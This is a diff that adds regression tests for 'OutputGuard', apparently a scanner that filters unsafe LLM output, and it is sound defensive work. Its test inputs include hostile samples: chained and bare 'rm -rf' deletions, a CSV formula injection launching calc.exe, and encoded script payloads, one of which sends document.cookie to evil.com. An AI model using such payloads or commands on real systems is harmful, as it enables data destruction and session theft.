@@ -143,4 +143,56 @@ describe("OutputGuard (LLM05 — Improper Output Handling)", () => {
       expect(r.sanitized).toContain("'=HYPERLINK");
     });
   });
+
+  describe("Fix batch regressions", () => {
+    it("blocks a chained destructive command standalone (critical)", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("do the setup && rm -rf /tmp/x");
+      expect(r.allowed).toBe(false);
+    });
+
+    it("blocks a CSV cell invoking a named dangerous function standalone (critical)", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("=+cmd|calc.exe");
+      expect(r.allowed).toBe(false);
+    });
+
+    it("does not block a bare '=' spreadsheet formula standalone (stays high, not critical)", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("=SUM(A1:A10)");
+      expect(r.allowed).toBe(true);
+      expect(r.threats.some((t) => t.type === "csv_formula_injection")).toBe(true);
+    });
+
+    it("does not block a bare backtick command alone (dangerous-verb critical promotion was reverted)", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("`rm -rf /`");
+      expect(r.allowed).toBe(true);
+    });
+
+    it("does not block an ordinary documentation code span showing curl/chmod usage", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("To download the release, run `curl -O https://example.com/file.zip` in your terminal.");
+      expect(r.allowed).toBe(true);
+    });
+
+    it("catches an HTML-entity-encoded <script> payload via decode-and-rescan", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;");
+      expect(r.allowed).toBe(false);
+      expect(r.threats.some((t) => t.detail.includes("<script>"))).toBe(true);
+    });
+
+    it("catches a URL-encoded exfil payload via decode-and-rescan", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("%3Cscript%3Efetch(%22//evil.com/x%3Fd=%22+document.cookie)%3C/script%3E");
+      expect(r.allowed).toBe(false);
+    });
+
+    it("does not flag benign prose containing HTML entities or percent signs", () => {
+      const guard = new OutputGuard();
+      const r = guard.scan("Use &amp; instead of &lt; in XML attributes. Discount: save up to 20% on select items.");
+      expect(r.allowed).toBe(true);
+    });
+  });
 });
